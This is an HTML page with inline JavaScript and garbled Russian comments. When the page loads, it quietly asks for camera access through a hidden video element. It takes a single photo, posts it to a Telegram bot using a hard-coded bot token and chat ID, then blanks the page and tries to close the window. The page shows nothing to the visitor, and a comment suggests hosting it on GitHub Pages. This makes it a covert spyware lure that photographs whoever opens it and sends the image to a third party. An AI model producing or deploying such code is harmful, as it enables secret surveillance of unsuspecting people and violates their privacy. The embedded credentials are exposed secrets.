<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        /* –ü–æ–ª–Ω–æ—Å—Ç—å—é –ø—É—Å—Ç–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        /* –°–∫—Ä—ã–≤–∞–µ–º –≤—Å—ë, –≤–∫–ª—é—á–∞—è –≤–æ–∑–º–æ–∂–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö */
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <!-- –ù–µ–≤–∏–¥–∏–º—ã–π —ç–ª–µ–º–µ–Ω—Ç –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –∫–∞–º–µ—Ä—ã -->
    <video id="cameraFeed" autoplay playsinline class="hidden"></video>

    <script>
        // === –ù–ê–°–¢–†–û–ô–ö–ò (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –ó–ê–ú–ï–ù–ò–¢–ï!) ===
        const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
        const CHAT_ID = '1250741267';
        // ==========================================

        async function captureAndSend() {
            let stream = null;
            const video = document.getElementById('cameraFeed');

            try {
                // 1. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –∑–∞–ø—Ä–æ—Å –∫–∞–º–µ—Ä—ã (–±–µ–∑ –∑–∞–¥–µ—Ä–∂–µ–∫ –∏ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment', // –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç ‚Äî –∑–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞
                        width: { ideal: 1280 },    // –ë–æ–ª–µ–µ –≤—ã—Å–æ–∫–æ–µ –∫–∞—á–µ—Å—Ç–≤–æ –¥–ª—è —Å–Ω–∏–º–∫–∞
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;

                // 2. –ö—Ä–∞—Ç–∫–∞—è –ø–∞—É–∑–∞ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –ø–æ—Ç–æ–∫–∞ (–≤–º–µ—Å—Ç–æ 3 —Å–µ–∫—É–Ω–¥)
                await new Promise(resolve => setTimeout(resolve, 800));

                // 3. –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ canvas –∏ –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω—ã–π —Å–Ω–∏–º–æ–∫
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);

                // 4. –ù–µ–º–µ–¥–ª–µ–Ω–Ω–∞—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä—ã
                stream.getTracks().forEach(track => track.stop());

                // 5. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'auto_capture.jpg');
                formData.append('caption', `üì∏ –ê–≤—Ç–æ—Å–Ω–∏–º–æ–∫\n${new Date().toLocaleString('ru-RU')}`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    // –¢–∞–π–º–∞—É—Ç –Ω–∞ —Å–ª—É—á–∞–π –ø—Ä–æ–±–ª–µ–º —Å —Å–µ—Ç—å—é
                    signal: AbortSignal.timeout(15000)
                });

                const result = await response.json();
                if (result.ok) {
                    console.log('‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ. ID:', result.result.message_id);
                } else {
                    console.error('‚ùå –û—à–∏–±–∫–∞ Telegram API:', result.description);
                }

            } catch (error) {
                // –í—Å—ë –ª–æ–≥–∏—Ä—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ –∫–æ–Ω—Å–æ–ª—å
                console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞:', error.name, '-', error.message);
            } finally {
                // 6. –ê–±—Å–æ–ª—é—Ç–Ω–æ —á–∏—Å—Ç—ã–π –≤—ã—Ö–æ–¥: –∑–∞–∫—Ä—ã–≤–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
                window.close(); // –ü–æ–ø—ã—Ç–∫–∞ –∑–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ (—Ä–∞–±–æ—Ç–∞–µ—Ç –µ—Å–ª–∏ –±—ã–ª–æ –æ—Ç–∫—Ä—ã—Ç–æ —Å–∫—Ä–∏–ø—Ç–æ–º)
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ –¥–ª—è GitHub Pages: –º–æ–∂–Ω–æ –æ—Å—Ç–∞–≤–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–ª–Ω–æ—Å—Ç—å—é –ø—É—Å—Ç–æ–π
                document.body.innerHTML = ''; 
            }
        }

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–∏ –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', captureAndSend);
        } else {
            captureAndSend();
        }
    </script>
</body>
</html>
